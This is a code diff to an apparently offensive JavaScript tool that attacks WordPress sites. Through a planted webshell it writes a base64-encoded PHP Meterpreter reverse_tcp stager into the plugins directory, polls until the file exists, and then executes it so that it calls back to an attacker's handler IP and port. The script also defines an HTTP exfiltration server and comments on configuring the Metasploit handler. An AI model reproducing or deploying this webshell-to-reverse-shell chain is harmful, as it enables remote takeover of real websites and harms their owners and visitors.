@@ -25,8 +25,9 @@
 var httpExfilServer = "http://192.168.78.135:8888";
 
 
-// This will hold the webshell location
-var webShellPath = "shell/shell.php";
+// This will hold the webshell locations
+var webShellPath    = "shell/shell.php";
+var phpMetShellPath = "shell/meterpreter.php";
 
 
 
@@ -414,9 +415,8 @@ async function hideYertleShell()
 
 
 
-
-// Work in progres...
-function openPhpMeterpreterSession()
+// Set your handler's IP and port below.
+async function openPhpMeterpreterSession()
 {
 	// This is the listening IP and port 
 	// for the meterpreter handler. 
@@ -427,11 +427,12 @@ function openPhpMeterpreterSession()
 
 	var metPhpCommand = `<?php
     error_reporting(0);
-    $ip   = ` + handlerIP + ";";
+    $ip   = '` + handlerIP + "';";
 
-    metPhpCommand += "$port = " + handlerPort + ";";
+    metPhpCommand += "$port = "+ handlerPort + ";";
 
-   	metPhpCommand += `if (($f = 'stream_socket_client') && is_callable($f)) {
+   	metPhpCommand += `
+   	if (($f = 'stream_socket_client') && is_callable($f)) {
         $s      = $f("tcp://{$ip}:{$port}");
         $s_type = 'stream';
     } elseif (($f = 'fsockopen') && is_callable($f)) {
@@ -481,20 +482,79 @@ function openPhpMeterpreterSession()
     ?>`;
 
     var payload = btoa(metPhpCommand);
-    console.log("Base64 PHP code is: " + payload);
+    var commandValue = "php -r \'echo base64_decode(\"" + payload + "\");\' > meterpreter.php\n";
+    var encodedCommand = btoa(commandValue);
+    var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCommand;
 
-    var commandValue = btoa("php -r \'echo base64_decode(\"" + payload + "\"); > meterpreter.php'");
 
-    console.log("Command value is: " + commandValue);
+    // We can't use the uploaded shell to write the meterpretery shell
+    // until it's fully installed, check to make sure it's there...
+    while (true)
+	{
+		var testUri = "/wp-content/plugins/" + webShellPath;
+		var xhr = new XMLHttpRequest();
+		xhr.open('GET', testUri, false);  
+		xhr.send(null);
 
-    var uri = "/wp-content/plugins/shell/shell.php?cmd=" + commandValue;
+		if (xhr.status == 200) 
+		{
+  			//console.log("!! Our shell is ready!");
+  			break;
+		}
+		if (xhr.status == 404)
+		{
+			//console.log("Shell is still 404'ing...");
+			await sleep(5000);
+			continue;
+		}
+	}
 
     // Ok, let's upload our meterpreter php file...
 	xhr = new XMLHttpRequest();
 	
 	xhr.open("GET", uri, true);
 	xhr.send(null);
+
+	console.log("PHP Meterpreter shell uploaded...");
+
+    // We can't use the uploaded meterpreter shell
+    // until it's fully on the disk check to make sure it's there
+    // before executing the meterpreter shell...
+    while (true)
+	{
+		var testUri = "/wp-content/plugins/" + phpMetShellPath;
+		var xhr = new XMLHttpRequest();
+		xhr.open('GET', testUri, false);  
+		xhr.send(null);
+
+		if (xhr.status == 200) 
+		{
+  			console.log("!! Our meterpreter shell is ready!");
+  			break;
+		}
+		if (xhr.status == 404)
+		{
+			console.log("Meterpreter shell is still 404'ing...");
+			await sleep(5000);
+			continue;
+		}
+	}
+
+
+	 console.log ("Sending command to execute shell...");
+     commandValue = "php meterpreter.php";
+     payload = btoa(commandValue);
+
+     var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + payload;
+
+     xhr.open("GET", uri, true);
+	 xhr.send(null);
+
+	 // insert shell happy dance here
 }
+
+
+
 
 
 // handy
@@ -586,10 +646,15 @@ function writeFile()
 
 
 
-// Someday this is going to work....
+// Make sure you set the 
+// IP address and port for your 
+// meterpreter handler
+// multi/handler
+// payload is php/meterpreter/reverse_tcp
 //openPhpMeterpreterSession();
 
 
+// Prototypes for playing around
 //runCmd();
 //writeFile();
 
